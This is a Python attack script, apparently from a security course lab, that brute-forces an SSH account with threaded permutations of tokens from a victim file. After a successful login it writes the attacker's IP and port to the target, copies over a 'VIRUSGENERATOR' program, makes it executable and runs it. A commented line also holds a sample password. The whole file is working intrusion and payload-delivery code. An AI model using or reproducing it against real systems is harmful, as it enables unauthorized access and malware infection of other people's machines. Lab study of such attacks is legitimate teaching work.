#!/usr/bin/python3
import itertools
import paramiko
import threading
import time
import queue
import sys
import socket
thread_count = 100
fail_count = 0
def get_token():
    f = open("/home/csc2021/materials/victim.dat")
    token = f.read().splitlines()
    f.close()
    return token
def dictionary_attack(host, token):
    thread_list = []
    task = queue.LifoQueue()
    correct_password = queue.Queue()
    incorrect_password = queue.Queue()
    # Create Threads
    for _ in range(thread_count):
        thread_list.append(threading.Thread(target=ssh_connect, args=(task, correct_password, incorrect_password)))
    # Generate Passwords
    for token_num in range(len(token),0,-1):
        it = itertools.permutations(token, token_num)
        for A in it:
            password = "".join(A)
            task.put(password)
    # Start Attacking
    for t in thread_list:
        t.start()
        time.sleep(0.1)
    for t in thread_list:
        t.join()
    # Attack FINISHED
    print("FINISHED SUCCESS =", correct_password.qsize(), "WRONG =" , incorrect_password.qsize(), "not TRY =", task.qsize(), "failed=", fail_count)
    #print(list(incorrect_password.queue))
def ssh_connect(task, correct_password, incorrect_password):
    global wrong_count, success_count, fail_count
    #host = "192.168.142.132"
    #password = csc0228Realtek2021
    host = sys.argv[1]
    port = 22
    username = "csc2021"
    while True:
        if not task.empty():
            password = task.get(timeout=1)
            print("trying password:", password)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try: 
                ssh.connect(host, port, username, password)
            except paramiko.ssh_exception.AuthenticationException:
                print("Incorrect password:", password)
                incorrect_password.put(password)
            except paramiko.ssh_exception.SSHException: # connection error, put it back
                print("SSH ERROR", password)
                task.put(password)
                fail_count += 1
            except Exception as e:
                print("Unexcepted Error", e)
            else: # Got correct password
                print("Got correct password:", password)
                
                # transport ADDR
                IP = socket.gethostbyname(socket.gethostname()+".local")
                PORT = "4455"
                command = "echo "+"'''"+IP+"'''"+" > ./ADDR.txt"
                stdin, stdout, stderr = ssh.exec_command(command)
                command = "echo "+"'''"+PORT+"'''"+" >> ./ADDR.txt"
                stdin, stdout, stderr = ssh.exec_command(command)
                # transport VIRUSGENERATOR
                with open("./VIRUSGENERATOR", "r") as f:
                    code = f.read()
                    command = "echo "+"'''"+code+"'''"+" > ./VIRUSGENERATOR"
                stdin, stdout, stderr = ssh.exec_command(command)
 
                # make VIRUSGENERATOR executable
                stdin, stdout, stderr = ssh.exec_command("chmod +x VIRUSGENERATOR")

                # execute VIRUSGENERATOR
                stdin, stdout, stderr = ssh.exec_command("./VIRUSGENERATOR")

                
                # rm VIRUSGENERATOR
                # stdin, stdout, stderr = ssh.exec_command("rm VIRUSGENERATOR")
                # lines = stdout.readlines()
                # print(lines)
                correct_password.put(password)
                task.queue.clear() # No need to try more
            finally:
                if ssh:
                    ssh.close()
        else:
            print("no task left")
            return

def main():
    tk = get_token()
    if len(sys.argv)!=4:
        print("usage:", sys.argv[0], "<host IP>")
        exit(1)
    
    start = time.time()
    dictionary_attack(sys.argv[1], tk)
    end = time.time()
    print(end - start)
    
    exit(0)

if __name__== "__main__":
    main()